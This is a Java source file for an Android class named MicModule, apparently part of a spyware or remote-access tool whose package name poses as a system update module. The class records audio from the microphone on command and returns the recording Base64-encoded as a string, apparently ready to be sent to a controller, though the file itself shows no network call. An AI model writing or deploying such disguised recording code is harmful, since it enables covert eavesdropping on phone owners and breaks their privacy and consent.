package com.android.system.update.modules;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.media.MediaRecorder;
import android.util.Base64;
import androidx.core.app.ActivityCompat;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

public class MicModule {
    private Context context;
    private MediaRecorder mediaRecorder;
    private String audioFilePath;
    private boolean isRecording = false;
    
    public MicModule(Context context) {
        this.context = context;
    }
    
    public String startRecording(int durationSeconds) {
        if (!checkPermission()) return "ERROR: No microphone permission";
        
        try {
            audioFilePath = context.getExternalFilesDir(null) + "/audio_" + System.currentTimeMillis() + ".3gp";
            
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mediaRecorder.setOutputFile(audioFilePath);
            mediaRecorder.prepare();
            mediaRecorder.start();
            isRecording = true;
            
            return "Recording started";
        } catch (IOException e) {
            e.printStackTrace();
            return "ERROR: " + e.getMessage();
        }
    }
    
    public String stopRecording() {
        if (mediaRecorder != null && isRecording) {
            try {
                mediaRecorder.stop();
                mediaRecorder.release();
                mediaRecorder = null;
                isRecording = false;
                
                File audioFile = new File(audioFilePath);
                if (audioFile.exists()) {
                    FileInputStream fis = new FileInputStream(audioFile);
                    byte[] bytes = new byte[(int) audioFile.length()];
                    fis.read(bytes);
                    fis.close();
                    return Base64.encodeToString(bytes, Base64.DEFAULT);
                }
            } catch (IOException e) {
                e.printStackTrace();
                return "ERROR: " + e.getMessage();
            }
        }
        return "No recording";
    }
    
    private boolean checkPermission() {
        return ActivityCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO)
            == PackageManager.PERMISSION_GRANTED;
    }
}